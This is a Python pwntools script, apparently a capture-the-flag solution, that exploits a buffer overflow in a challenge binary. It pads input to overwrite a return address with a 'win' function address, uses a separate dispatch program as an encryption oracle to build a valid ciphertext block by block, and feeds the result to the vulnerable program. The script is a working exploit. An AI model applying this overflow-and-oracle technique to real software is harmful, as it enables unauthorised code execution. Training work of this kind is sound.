from pwn import *
import subprocess
import struct

win_addr = 0x4018f7
offset = 90

payload = b"A" * offset

# Split payload into 16-byte blocks
blocks = [payload[i:i+15] for i in range(0, len(payload) - 1, 15)]

# Add the last block that conatains the address 
blocks.append(b"A" * 8 + p64(win_addr))

ciphertext = b""
for i, block in enumerate(blocks):
    in_file = f"block_{i}.in"
    out_file = f"block_{i}.out"

    with open(in_file, "wb") as f:
        f.write(block)

    subprocess.run(f"/challenge/dispatch < {in_file} > {out_file}", shell=True)

    with open(out_file, "rb") as f:
        block_data = f.read()
        if i == 0:
            # First block includes header + length + part of message
            ciphertext += block_data
        else:
            # Only include the encrypted message portion
            ciphertext += block_data[16:]

# Send the crafted ciphertext to the vulnerable binary
p = process("/challenge/vulnerable-overflow")
p.send(ciphertext)
p.interactive()
